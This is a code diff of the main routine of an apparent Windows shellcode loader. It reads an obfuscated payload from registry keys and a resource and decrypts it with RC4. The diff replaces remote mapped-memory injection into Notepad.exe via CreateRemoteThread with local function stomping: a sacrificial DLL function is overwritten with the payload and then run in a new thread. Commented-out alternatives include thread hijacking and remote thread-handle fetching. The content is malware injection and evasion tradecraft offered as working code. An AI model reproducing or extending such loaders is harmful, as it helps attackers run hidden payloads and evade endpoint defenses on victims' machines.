@@ -8,21 +8,28 @@ int main()
 	SIZE_T sBytesWritten = 0, sPaddedInputSize = 64, sObfuscatedSize = 0, sClearPayload = 0, sOriginalInputSize = 64;
 	Context RC4Context_t;
 	RESOURCE resource;
-	PVOID pExPayload, pMain;
+	PVOID pExPayload, pStompingTarget = NULL;
 	LPWSTR TargetProcessName = L"Notepad.exe";
 
-	
 
-	if(!FetchLocalAllertableThread(GetCurrentThreadId(), &dwThreadId, &hThread)) return -2;
 
+	//if(!FetchLocalAllertableThread(GetCurrentThreadId(), &dwThreadId, &hThread)) return -2;
+
+	//CreateDebuggedProcess("Notepad.exe", &dwPID1, &hProcess1, &hThread1);
+	/*
 	if (!EnumProcessNTQuerySystemInformation(TargetProcessName, &dwPID0, &hProcess)) 
 	{
 		wprintf(L"[!] Enumerate Processes Nt Query System Information Failed to Find %s\n", TargetProcessName);
 		return -1;
 	}
+
+	if(!FetchRemoteThreadHandle(dwPID0, &dwThreadId, &hThread)) return -2;
+
 	wprintf(L"[i] Found %s Process with id %d\n", TargetProcessName, dwPID0);
+	*/
+
+	if (!FetchStompingTarget(SACRIFICIAL_DLL, SACRIFICIAL_FUNC, &pStompingTarget)) return -12;
 	
-	//CreateDebuggedProcess("Notepad.exe", &dwPID1, &hProcess1, &hThread1);
 
 	if (!ReadRegKeys(&pObfOutput, &sObfuscatedSize)) return -1;
 
@@ -40,7 +47,9 @@ int main()
 
 	if (!FetchResource(&resource)) return -5;
 
-	InjectPayloadRemoteMappedMemory(resource.pAddress, &pExtPayloadAddres, &pObfInput,resource.sSize, &hPayloadObjectHandle,hProcess);
+	if (!(pObfInput = LocalAlloc(LPTR, resource.sSize))) return -14;
+
+	//InjectPayloadRemoteMappedMemory(resource.pAddress, &pExtPayloadAddres, &pObfInput,resource.sSize, &hPayloadObjectHandle,hProcess);
 	
 	if (!rInit(&RC4Context_t, pKey, strlen((CHAR*)pKey))) return -6;
 
@@ -49,10 +58,17 @@ int main()
 	//if(!MapLocalMemory(pPayload_t.pText, &pExtPayloadAddres, pPayload_t.sText, &hPayloadObjectHandle))return -7;
 	//InjectPayloadRemoteMappedMemory(pExtPayloadAddres, &pExtPayloadAddres, resource.sSize, &hPayloadObjectHandle, hProcess);
 
-	printf("0x%p\n", pExtPayloadAddres);
-	hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pExtPayloadAddres, NULL, NULL, &dwThreadId);
+	if (!StompFunction(pStompingTarget, pObfInput, resource.sSize))return -13; 
 
-	WaitForSingleObjectEx(hThread, 150, TRUE);
+	//SetupScanFileQueueA(NULL, NULL, NULL, NULL, NULL, NULL);
+	
+	printf("0x%p\n", pStompingTarget);
+//	UnmapViewOfFile(pObfInput);
+
+	//HijackThread(hThread, pStompingTarget);
+
+	hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pStompingTarget, NULL, NULL, &dwThreadId);
+	if(!hThread) WaitForSingleObject(hThread, INFINITE);
 
 	//hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pExtPayloadAddres, NULL, NULL, &dwThreadId);
 
@@ -68,11 +84,12 @@ int main()
 
 	//WaitForSingleObject(hThread, 150);
 
-	UnmapViewOfFile(pExtPayloadAddres);
+	//if (!UnmapViewOfFile(pObfInput)) printf("[x] Remote memory Unmapping Failed With Error 0x%lx", GetLastError());
+	
 
-	printf("Injecting Shellcode At Address: 0x%p\n", pExtPayloadAddres);
+	printf("Injecting Shellcode At Address: 0x%p\n", pStompingTarget);
 
-	getchar();
+	//getchar();
 
 	//DebugActiveProcessStop(dwPID1);
 
